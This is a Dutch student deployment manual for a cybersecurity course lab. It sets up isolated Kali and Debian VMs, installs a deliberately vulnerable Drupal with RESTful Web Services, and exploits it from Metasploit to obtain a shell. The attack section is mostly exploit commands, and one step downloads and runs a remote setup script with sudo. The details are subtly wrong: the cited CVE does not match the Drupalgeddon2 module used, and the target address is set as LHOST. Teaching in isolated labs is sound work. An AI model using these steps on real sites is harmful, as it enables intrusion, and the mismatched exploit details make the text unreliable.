# CSV-NPE-2223

Cybersecurity &amp; Virtualisation - NPE Opdracht 2022-2023

# Deployment manual

## 1. VM installaties

### Informatie

- De VM's zijn geconfigureerd met een host-only netwerk adapter
- De installatie vereist een internet connectie

### Setup op host machine

- Download volgende vdi-bestanden van osboxes.org:

  - [Kali Linux 2022.3](https://sourceforge.net/projects/osboxes/files/v/vb/25-Kl-l-x/2022.3/64bit.7z/download)
  - [Debian 11 - Desktop](https://sourceforge.net/projects/osboxes/files/v/vb/14-D-b/11/Workstation/64bit.7z/download)

- Unzip de vdi-bestanden rechtstreeks in de download folder de huidige gebruiker
- Check of de vdi-bestanden de volgende namen hebben:

  - Kali Linux 2022.3 (64bit).vdi
  - Debian 11 (64bit).vdi

- Voer de volgende commando's uit in powerhshell van de host machine:

  ```powershell
    ./vm-installation.ps1
  ```

## 2. Drupal installatie

### Drupal 7.x en 8.x - - RESTful Web Services unserialize() Remote Command Execution [Exploit](https://nvd.nist.gov/vuln/detail/CVE-2019-6340)

### Informatie

- De exploit is beschikbaar op [exploit-db](https://www.exploit-db.com/exploits/46510)
- De exploit veroorzaakt een unserialize() fout in de `Drupal 7/8 RESTful Web Services` module, waardoor we een remote command execution kunnen uitvoeren
- Deze manual gebruikt de `drupal_drupalgeddon2` [module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/drupal_drupalgeddon2.md) van metasploit om de exploit uit te voeren.

### Setup op Debian VM

- Log in op de Debian VM met de volgende gegevens:

  - Username: `osboxes`
  - Password: `osboxes.org`

- Installeer de mysql repository en selecteer in de prompt `debian buster` en en `mysql-5.7` als versie van mysql:

  ```bash
    wget https://dev.mysql.com/get/mysql-apt-config_0.8.18-1_all.deb
    sudo dpkg -i mysql-apt-config_0.8.18-1_all.deb
  ```

- Download en run het installatie script:

  ```bash
    wget https://jobbe.be/csv-npe-2223/drupal-install.sh
    chmod +x drupal-install.sh
    sudo ./drupal-install.sh
  ```

- Na de installatie is drupal beschikbaar op `http://localhost/index.php`
- Configureer Drupal met de volgende gegevens:

  - Database name: `drupal`
  - Database username: `drupal`
  - Database password: `password`
  - Site name: `drupal`
  - Site email address: `drupal@localhost.be`
  - Username: `drupal`
  - Password: `drupal`
  - Default country: `Belgium`
  - Default timezone: `Europe/Brussels`

- Verwijder de standaard web pagina in /var/www/html:

  ```bash
    sudo rm -rf /var/www/CybersecurityNPE2023.local/index.html
  ```

- Activeer de volgende modules onderaan in de `Modules` pagina van Drupal:

  - `Entity API`
  - `RESTful Web Services`

- Deactiveer de enp0s3 netwerk adapter en activeer de enp0s8 netwerk adapter in de instellingen van de Debian VM

- Check het ip-adres van de Debian VM met het volgende commando:

  ```bash
    ip a
  ```

## 3. Metesploit

### Exploit op Kali VM

- Log in op de Kali VM met de volgende gegevens:

  - Username: `osboxes`
  - Password: `osboxes.org`

- Deactiveer de enp0s3 netwerk adapter en activeer de enp0s8 netwerk adapter in de instellingen van de Kali VMs

- Open een terminal en voer volgende commando's uit:

  ```bash
    sudo msfdb init
    sudo msfconsole
  ```

- Voer volgende commando's uit in de metasploit console om de host te in te stellen (vervang xxx.xxx.xxx.xxx met het ip-adres van de Debian VM):

  ```bash
    use exploit/unix/webapp/drupal_drupalgeddon2
    set LHOST xxx.xxx.xxx.xxx
    set VERBOSE true
    check
  ```

- Voer volgende commando's uit in de metasploit console om de exploit uit te voeren:

  ```bash
    run
  ```

- Als de exploit succesvol is uitgevoerd, kan je een shell openen met volgende commando's:

  ```bash
    whoami
    ls
  ```
